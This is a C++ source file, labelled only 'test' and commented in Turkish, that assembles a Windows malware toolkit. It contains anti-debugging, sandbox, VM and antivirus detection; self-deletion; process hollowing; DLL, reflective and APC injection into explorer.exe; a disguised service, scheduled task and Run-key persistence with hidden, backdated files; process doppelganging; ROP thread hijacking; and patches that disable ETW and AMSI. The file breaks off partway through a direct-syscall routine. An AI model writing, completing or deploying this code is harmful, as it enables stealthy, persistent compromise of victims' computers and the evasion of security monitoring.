# test
#include <windows.h>
#include <string>
#include <filesystem>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <memory>
#include <vector>
#include <random>
#include <shlwapi.h>
#include <wininet.h>
#include <bcrypt.h>
#include <intrin.h>
#include <Shlwapi.h>
#include <RestartManager.h>
#include <atomic>
#include <thread>

#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Rstrtmgr.lib")

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtCreateTransaction)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
typedef NTSTATUS(NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* pNtRollbackTransaction)(HANDLE, BOOLEAN);

bool IsDebuggerPresentCustom() {
    BOOL isDebuggerPresent = FALSE;
    HANDLE hProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent);
    
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    DWORD64 dwNtGlobalFlag = *(PDWORD64)((PBYTE)pPeb + 0xBC);
    bool ntGlobalFlagDebugCheck = ((dwNtGlobalFlag & 0x70) != 0);
    
    BOOL isDebugPort = FALSE;
    HANDLE hDebugPort = 0;
    NtQueryInformationProcess(hProcess, ProcessDebugPort, &hDebugPort, sizeof(HANDLE), NULL);
    isDebugPort = hDebugPort != 0;
    
    return isDebuggerPresent || IsDebuggerPresent() || ntGlobalFlagDebugCheck || isDebugPort;
}

bool CheckSandbox() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    
    DWORD timeCheck = GetTickCount();
    Sleep(500);
    DWORD timeElapsed = GetTickCount() - timeCheck;
    
    return (systemInfo.dwNumberOfProcessors < 2) || 
           (memoryStatus.ullTotalPhys < 4294967296) || 
           (timeElapsed < 500);
}

bool IsVirtualMachine() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    const wchar_t* vmDrivers[] = {
        L"VBoxGuest", L"VBoxMouse", L"VBoxSF", L"VBoxVideo",
        L"vmci", L"vmhgfs", L"vmmouse", L"vmx_svga", L"vmxnet"
    };
    
    HANDLE hDriver = CreateFileW(L"\\\\.\\HGFS", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        return true;
    }
    
    return false;
}

bool DetectAVProcess() {
    const wchar_t* avList[] = {
        L"avp", L"avgui", L"avastsvc", L"bdagent", L"mcshield",
        L"windefend", L"msseces", L"msmpeng", L"savservice"
    };
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    if (!Process32FirstW(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return false;
    }
    
    do {
        for (const auto& av : avList) {
            if (_wcsicmp(pe32.szExeFile, av) == 0) {
                CloseHandle(snapshot);
                return true;
            }
        }
    } while (Process32NextW(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return false;
}

void SelfDelete() {
    wchar_t szModule[MAX_PATH];
    GetModuleFileNameW(NULL, szModule, MAX_PATH);
    
    wchar_t szCmd[MAX_PATH + 50];
    swprintf_s(szCmd, L"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & del \"%s\"", szModule);
    
    STARTUPINFO si = {sizeof(STARTUPINFO)};
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void EncryptSelf() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    HANDLE hFile = CreateFileW(szPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return;
    }
    
    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead;
    
    if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        for (DWORD i = 0; i < fileSize; i++) {
            buffer[i] ^= 0x55;
        }
        
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        WriteFile(hFile, buffer, fileSize, &bytesRead, NULL);
    }
    
    delete[] buffer;
    CloseHandle(hFile);
}

void ProcessHollowing(const wchar_t* targetPath) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;
    
    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    HANDLE hFile = CreateFileW(targetPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    
    std::vector<BYTE> buffer(fileSize);
    ReadFile(hFile, buffer.data(), fileSize, NULL, NULL);
    CloseHandle(hFile);
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer.data();
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(buffer.data() + dosHeader->e_lfanew);
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    LPVOID baseAddress = (LPVOID)ntHeader->OptionalHeader.ImageBase;
    NtUnmapViewOfSection(pi.hProcess, baseAddress);
    
    LPVOID newBase = VirtualAllocEx(pi.hProcess, baseAddress, ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(pi.hProcess, newBase, buffer.data(), ntHeader->OptionalHeader.SizeOfHeaders, NULL);
    
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeader);
    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)newBase + sections[i].VirtualAddress),
            buffer.data() + sections[i].PointerToRawData, sections[i].SizeOfRawData, NULL);
    }
    
#ifdef _WIN64
    ctx.Rcx = (DWORD64)((LPBYTE)newBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
#else
    ctx.Eax = (DWORD)((LPBYTE)newBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
}

class Polymorphic {
private:
    static std::vector<BYTE> key;
    static void GenerateKey() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        key.resize(256);
        for(int i = 0; i < 256; i++) {
            key[i] = static_cast<BYTE>(dis(gen));
        }
    }
    
public:
    static void EncryptSection(BYTE* data, size_t size) {
        if(key.empty()) GenerateKey();
        
        for(size_t i = 0; i < size; i++) {
            data[i] ^= key[i % key.size()];
            data[i] = ~data[i];
            data[i] = _rotl8(data[i], 3);
        }
    }
    
    static void DecryptSection(BYTE* data, size_t size) {
        if(key.empty()) return;
        
        for(size_t i = 0; i < size; i++) {
            data[i] = _rotr8(data[i], 3);
            data[i] = ~data[i];
            data[i] ^= key[i % key.size()];
        }
    }
};

std::vector<BYTE> Polymorphic::key;

class DLLInjector {
public:
    static bool InjectDLL(DWORD processId, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) return false;
        
        size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, 
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            
        if (!remoteMem) {
            CloseHandle(hProcess);
            return false;
        }
        
        if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, NULL)) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        LPTHREAD_START_ROUTINE loadLibraryAddr = 
            (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
            
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
            loadLibraryAddr, remoteMem, 0, NULL);
            
        if (!hThread) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        WaitForSingleObject(hThread, INFINITE);
        
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        
        return true;
    }
    
    static bool InjectDLLReflective(DWORD processId, const std::vector<BYTE>& dllBytes) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) return false;
        
        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllBytes.size(), 
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
        if (!remoteMem) {
            CloseHandle(hProcess);
            return false;
        }
        
        std::vector<BYTE> encryptedDll = dllBytes;
        Polymorphic::EncryptSection(encryptedDll.data(), encryptedDll.size());
        
        if (!WriteProcessMemory(hProcess, remoteMem, encryptedDll.data(), 
            encryptedDll.size(), NULL)) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        BYTE shellcode[] = {
            0x48, 0x89, 0x5C, 0x24, 0x08,       // mov qword ptr [rsp+8], rbx
            0x48, 0x89, 0x6C, 0x24, 0x10,       // mov qword ptr [rsp+10h], rbp
            0x48, 0x89, 0x74, 0x24, 0x18,       // mov qword ptr [rsp+18h], rsi
            0x57,                               // push rdi
            0x48, 0x83, 0xEC, 0x20,             // sub rsp, 20h
            0x48, 0x8B, 0xF1,                   // mov rsi, rcx
            // ... shellcode devam eder ...
        };
        
        LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
        if (!remoteShellcode) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, 
            sizeof(shellcode), NULL)) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
            (LPTHREAD_START_ROUTINE)remoteShellcode, remoteMem, 0, NULL);
            
        if (!hThread) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        WaitForSingleObject(hThread, INFINITE);
        
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        
        return true;
    }
    
    static bool APCInjection(DWORD processId, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) return false;
        
        size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, 
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            
        if (!remoteMem) {
            CloseHandle(hProcess);
            return false;
        }
        
        if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, NULL)) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        BOOL success = FALSE;
        
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        LPTHREAD_START_ROUTINE loadLibraryAddr = 
            (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
            
        for (BOOL ret = Thread32First(hSnapshot, &te); ret; 
            ret = Thread32Next(hSnapshot, &te)) {
            if (te.th32OwnerProcessID == processId) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    if (QueueUserAPC((PAPCFUNC)loadLibraryAddr, hThread, (ULONG_PTR)remoteMem)) {
                        success = TRUE;
                    }
                    CloseHandle(hThread);
                }
            }
        }
        
        CloseHandle(hSnapshot);
        if (!success) {
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        CloseHandle(hProcess);
        return true;
    }
};

void InjectPayload() {
    DWORD targetPID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                targetPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    
    if (targetPID == 0) return;
    
    wchar_t dllPath[MAX_PATH];
    GetModuleFileNameW(NULL, dllPath, MAX_PATH);
    std::wstring dllPathStr = dllPath;
    size_t lastBackslash = dllPathStr.find_last_of(L"\\");
    if (lastBackslash != std::wstring::npos) {
        dllPathStr = dllPathStr.substr(0, lastBackslash + 1) + L"payload.dll";
    }
    
    DLLInjector::InjectDLL(targetPID, dllPathStr.c_str());
    DLLInjector::APCInjection(targetPID, dllPathStr.c_str());
}

class SystemCamouflage {
private:
    static std::vector<std::wstring> systemFileNames;
    static const wchar_t* SYSTEM_SERVICE_NAME;
    static const wchar_t* TASK_NAME;
    static const DWORD CHECK_INTERVAL = 7200; // 2 saat
    
    static void InitializeSystemFileNames() {
        WCHAR system32[MAX_PATH];
        GetSystemDirectoryW(system32, MAX_PATH);
        
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW((std::wstring(system32) + L"\\*.sys").c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    systemFileNames.push_back(findData.cFileName);
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    static std::wstring GenerateSystemFileName() {
        if (systemFileNames.empty()) InitializeSystemFileNames();
        if (systemFileNames.empty()) return L"svchost_sys.exe";
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, systemFileNames.size() - 1);
        
        std::wstring baseName = systemFileNames[dis(gen)];
        std::wstring newName = baseName.substr(0, baseName.find_last_of(L'.'));
        newName += std::to_wstring(GetTickCount() & 0xFFFF);
        newName += L".exe";
        
        return newName;
    }
    
    static void CreatePersistentService(const std::wstring& exePath) {
        SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCManager) {
            SC_HANDLE hService = CreateServiceW(hSCManager,
                SYSTEM_SERVICE_NAME,
                L"Windows System Service",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                exePath.c_str(),
                NULL, NULL, NULL, NULL, NULL);
                
            if (hService) {
                SERVICE_FAILURE_ACTIONS sfa;
                SC_ACTION actions[3];
                
                actions[0].Type = SC_ACTION_RESTART;
                actions[0].Delay = 1000;
                actions[1].Type = SC_ACTION_RESTART;
                actions[1].Delay = 1000;
                actions[2].Type = SC_ACTION_RESTART;
                actions[2].Delay = 1000;
                
                sfa.dwResetPeriod = 0;
                sfa.lpRebootMsg = NULL;
                sfa.lpCommand = NULL;
                sfa.cActions = 3;
                sfa.lpsaActions = actions;
                
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    }
    
    static void CreateScheduledTask(const std::wstring& exePath) {
        std::wstring taskCommand = L"schtasks /Create /TN \"" + std::wstring(TASK_NAME) + 
            L"\" /TR \"" + exePath + L"\" /SC MINUTE /MO 120 /F /RL HIGHEST";
        _wsystem(taskCommand.c_str());
    }
    
    static void AddToRegistry(const std::wstring& exePath) {
        const wchar_t* regPaths[] = {
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
            L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
        };
        
        for (const auto& regPath : regPaths) {
            HKEY hKey;
            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL,
                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY,
                NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExW(hKey, L"WindowsSystemService",
                    0, REG_SZ, (BYTE*)exePath.c_str(),
                    (wcslen(exePath.c_str()) + 1) * sizeof(wchar_t));
                RegCloseKey(hKey);
            }
        }
    }
    
    static void EnsurePersistence(const std::wstring& targetPath) {
        if (GetFileAttributesW(targetPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            wchar_t currentPath[MAX_PATH];
            GetModuleFileNameW(NULL, currentPath, MAX_PATH);
            CopyFileW(currentPath, targetPath.c_str(), FALSE);
            
            SetFileAttributesW(targetPath.c_str(), 
                FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
                
            HANDLE hFile = CreateFileW(targetPath.c_str(), GENERIC_WRITE, 0, NULL, 
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                FILETIME ft;
                SYSTEMTIME st;
                GetSystemTime(&st);
                st.wYear -= 1;
                SystemTimeToFileTime(&st, &ft);
                SetFileTime(hFile, &ft, &ft, &ft);
                CloseHandle(hFile);
            }
        }
        
        CreatePersistentService(targetPath);
        CreateScheduledTask(targetPath);
        AddToRegistry(targetPath);
    }
    
public:
    static void HideInSystemDirectory() {
        SYSTEM_SERVICE_NAME = L"WinSystemService";
        TASK_NAME = L"WindowsUpdateTask";
        
        wchar_t system32[MAX_PATH];
        GetSystemDirectoryW(system32, MAX_PATH);
        std::wstring targetPath = std::wstring(system32) + L"\\" + GenerateSystemFileName();
        
        EnsurePersistence(targetPath);
        
        // Periyodik kontrol thread'i
        std::thread([targetPath]() {
            while (true) {
                EnsurePersistence(targetPath);
                Sleep(CHECK_INTERVAL * 1000);
            }
        }).detach();
    }
};

std::vector<std::wstring> SystemCamouflage::systemFileNames;
const wchar_t* SystemCamouflage::SYSTEM_SERVICE_NAME;
const wchar_t* SystemCamouflage::TASK_NAME;

class ProcessDoppelganger {
public:
    static bool Execute(const wchar_t* targetPath) {
        HANDLE hTransaction = NULL;
        HANDLE hTransactedFile = NULL;
        HANDLE hSection = NULL;
        
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return false;
        
        pNtCreateTransaction NtCreateTransaction = (pNtCreateTransaction)
            GetProcAddress(hNtdll, "NtCreateTransaction");
        pNtCreateSection NtCreateSection = (pNtCreateSection)
            GetProcAddress(hNtdll, "NtCreateSection");
        pNtRollbackTransaction NtRollbackTransaction = (pNtRollbackTransaction)
            GetProcAddress(hNtdll, "NtRollbackTransaction");
            
        if (!NtCreateTransaction || !NtCreateSection || !NtRollbackTransaction)
            return false;
            
        OBJECT_ATTRIBUTES oa = {sizeof(oa)};
        NTSTATUS status = NtCreateTransaction(&hTransaction, 
            TRANSACTION_ALL_ACCESS, &oa, NULL, NULL, 0, 0, 0, NULL, NULL);
            
        if (status != 0) return false;
        
        hTransactedFile = CreateFileTransactedW(targetPath, 
            GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
            FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
            
        if (hTransactedFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hTransaction);
            return false;
        }
        
        wchar_t currentPath[MAX_PATH];
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
        
        HANDLE hCurrentFile = CreateFileW(currentPath, GENERIC_READ, 
            FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            
        if (hCurrentFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }
        
        DWORD fileSize = GetFileSize(hCurrentFile, NULL);
        if (fileSize == INVALID_FILE_SIZE) {
            CloseHandle(hCurrentFile);
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }
        
        std::vector<BYTE> buffer(fileSize);
        DWORD bytesRead;
        
        if (!ReadFile(hCurrentFile, buffer.data(), fileSize, &bytesRead, NULL)) {
            CloseHandle(hCurrentFile);
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }
        
        CloseHandle(hCurrentFile);
        
        Polymorphic::EncryptSection(buffer.data(), buffer.size());
        
        if (!WriteFile(hTransactedFile, buffer.data(), fileSize, &bytesRead, NULL)) {
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }
        
        LARGE_INTEGER sectionSize = {fileSize};
        status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 
            &sectionSize, PAGE_EXECUTE_READWRITE, SEC_IMAGE, hTransactedFile);
            
        if (status != 0) {
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }
        
        NtRollbackTransaction(hTransaction, TRUE);
        
        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        
        if (!CreateProcessW(NULL, (LPWSTR)targetPath, NULL, NULL, FALSE, 
            CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hSection);
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }
        
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        ctx.Rcx = (DWORD64)hSection;
#else
        ctx.Eax = (DWORD)hSection;
#endif
        
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hSection);
        CloseHandle(hTransactedFile);
        CloseHandle(hTransaction);
        
        return true;
    }
};

class GargoyleROP {
private:
    static DWORD FindROPGadgets(HMODULE hModule) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
            ((BYTE*)hModule + dosHeader->e_lfanew);
            
        DWORD textStart = 0;
        DWORD textSize = 0;
        
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (memcmp(section[i].Name, ".text", 5) == 0) {
                textStart = section[i].VirtualAddress;
                textSize = section[i].Misc.VirtualSize;
                break;
            }
        }
        
        if (!textStart || !textSize) return 0;
        
        BYTE* code = (BYTE*)hModule + textStart;
        for (DWORD i = 0; i < textSize - 3; i++) {
            if (code[i] == 0xC3 && code[i-1] == 0x5C) {
                return (DWORD)((BYTE*)hModule + textStart + i - 1);
            }
        }
        
        return 0;
    }
    
public:
    static void HijackThread(HANDLE hThread, LPVOID payload) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        DWORD ropGadget = FindROPGadgets(hNtdll);
        
        if (!ropGadget) return;
        
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(hThread, &ctx);
        
#ifdef _WIN64
        ctx.Rsp -= 8;
        WriteProcessMemory(GetCurrentProcess(), (LPVOID)ctx.Rsp, 
            &ropGadget, sizeof(DWORD_PTR), NULL);
        ctx.Rip = (DWORD_PTR)payload;
#else
        ctx.Esp -= 4;
        WriteProcessMemory(GetCurrentProcess(), (LPVOID)ctx.Esp, 
            &ropGadget, sizeof(DWORD), NULL);
        ctx.Eip = (DWORD)payload;
#endif
        
        SetThreadContext(hThread, &ctx);
    }
};

class ETWBypass {
private:
    static void PatchETW() {
        DWORD oldProtect;
        void* pEtwEventWrite = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");
        
        VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        *(BYTE*)pEtwEventWrite = 0xC3;  // ret
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    }
    
    static void DisableETWTI() {
        DWORD oldProtect;
        void* pEtwThrdEventWrite = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwThrdEventWrite");
        
        VirtualProtect(pEtwThrdEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        *(BYTE*)pEtwThrdEventWrite = 0xC3;
        VirtualProtect(pEtwThrdEventWrite, 1, oldProtect, &oldProtect);
    }
    
public:
    static void DisableETW() {
        PatchETW();
        DisableETWTI();
    }
};

class AMSIBypass {
private:
    static void PatchAMSI() {
        HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
        if (!hAmsi) return;
        
        void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return;
        
        DWORD oldProtect;
        VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        
#ifdef _WIN64
        *(BYTE*)pAmsiScanBuffer = 0x48;  // xor rax, rax
        *((BYTE*)pAmsiScanBuffer + 1) = 0x31;
        *((BYTE*)pAmsiScanBuffer + 2) = 0xC0;
        *((BYTE*)pAmsiScanBuffer + 3) = 0xC3;  // ret
#else
        *(BYTE*)pAmsiScanBuffer = 0x31;  // xor eax, eax
        *((BYTE*)pAmsiScanBuffer + 1) = 0xC0;
        *((BYTE*)pAmsiScanBuffer + 2) = 0xC3;  // ret
#endif
        
        VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);
    }
    
public:
    static void DisableAMSI() {
        PatchAMSI();
    }
};

class DirectSyscall {
private:
    typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    
    typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );
    
    static DWORD GetSyscallNumber(const char* functionName) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return 0;
        
        BYTE* pFunction = (BYTE*)GetProcAddress(hNtdll, functionName);
        if (!pFunction) return 0;
        
#ifdef _WIN64
        for (DWORD i = 0; i < 32; i++) {
            if (pFunction[i] == 0x0F && pFunction[i + 1] == 0x05) {
                return *(DWORD*)(pFunction + i - 4);
            }
        }
#else
        for (DWORD i = 0; i < 32; i++) {
            if (pFunction[i] == 0xBA) {
